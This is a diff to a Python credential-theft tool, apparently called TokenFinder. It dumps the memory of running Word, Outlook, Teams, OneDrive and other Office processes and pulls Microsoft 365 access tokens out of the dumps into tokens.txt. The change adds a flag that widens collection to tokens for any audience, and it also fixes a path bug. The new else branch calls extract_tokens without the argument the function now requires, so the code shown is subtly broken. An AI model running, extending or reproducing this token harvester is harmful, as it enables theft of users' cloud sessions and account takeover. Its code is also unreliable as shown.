@@ -14,7 +14,6 @@ dbghelp = ctypes.windll.dbghelp
 
 known_processes = ["WINWORD", "ONENOTE", "POWERPNT", "OUTLOOK", "EXCEL", "OneDrive", "Teams"]
 
-
 def createMiniDump(pid, file_name):
     pHandle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ,0, pid)
     fHandle = win32file.CreateFile(file_name,
@@ -27,7 +26,6 @@ def createMiniDump(pid, file_name):
 
     success = dbghelp.MiniDumpWriteDump(pHandle.handle,pid,fHandle.handle,2,None,None,None,)
     return success
-
 
 def extract_office_processes(pids):
     # Iterate over all running process
@@ -59,9 +57,12 @@ def add_process(processName, processID, process_pairs):
     process_pairs.append([processID, processName])
     print(f"{processName} -- {processID}")
 
-
-def extract_tokens():
-    known_aud = ["https://graph.microsoft.com/", "https://outlook.office365.com/", "https://outlook.office.com",
+def extract_tokens(ignore_known_aud: bool):
+    if ignore_known_aud:
+        print("\nIgnore flag set. Setting audience to '.'\n")
+        known_aud = [ '.' ]
+    else:
+        known_aud = ["https://graph.microsoft.com/", "https://outlook.office365.com/", "https://outlook.office.com",
                  "sharepoint.com", '00000003-0000-0000-c000-000000000000']
 
     extract_tokens = set()
@@ -96,7 +97,6 @@ def extract_tokens():
                     except:
                         pass
 
-
 def create_dump_files():
     try:
         pids = args["pids"]
@@ -107,7 +107,7 @@ def create_dump_files():
             pass
 
         for pair in process_pairs:
-            createMiniDump(pair[0], "Dump/" + str(pair[0] + "-" + str(pair[1]) + ".DMP")
+            createMiniDump(pair[0], "Dump/" + str(pair[0]) + "-" + str(pair[1]) + ".DMP")
 
         return True
     except:
@@ -116,17 +116,18 @@ def create_dump_files():
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
     print('''
- _______      _                    _______  _             _               
+ _______      _                    _______  _             _              
 (_______)    | |                  (_______)(_)           | |              
-    _   ___  | |  _  _____  ____   _____    _  ____    __| | _____   ____ 
+    _   ___  | |  _  _____  ____   _____    _  ____    __| | _____   ____
    | | / _ \ | |_/ )| ___ ||  _ \ |  ___)  | ||  _ \  / _  || ___ | / ___)
    | || |_| ||  _ ( | ____|| | | || |      | || | | |( (_| || ____|| |    
    |_| \___/ |_| \_)|_____)|_| |_||_|      |_||_| |_| \____||_____)|_|    
-                                                                          
+                                                                         
     ''')
 
     parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
     parser.add_argument("-p", "--pids", default=None, help="Process pids to extract tokens from", nargs='+', type=int)
+    parser.add_argument("-i", "--ignore", default=False, help="Ignore known audiences (extract wider range of tokens)", type=bool)
     args = vars(parser.parse_args())
 
     isDumpSucceeded = create_dump_files()
@@ -135,6 +136,9 @@ if __name__ == '__main__':
         print("Error in creating dump files :(")
         exit(1)
 
-    extract_tokens()
+    if args["ignore"]:
+        extract_tokens(ignore_known_aud=True)
+    else:
+        extract_tokens()
     shutil.rmtree('Dump')
     print("\nTokens were extracted to tokens.txt! Enjoy :)")
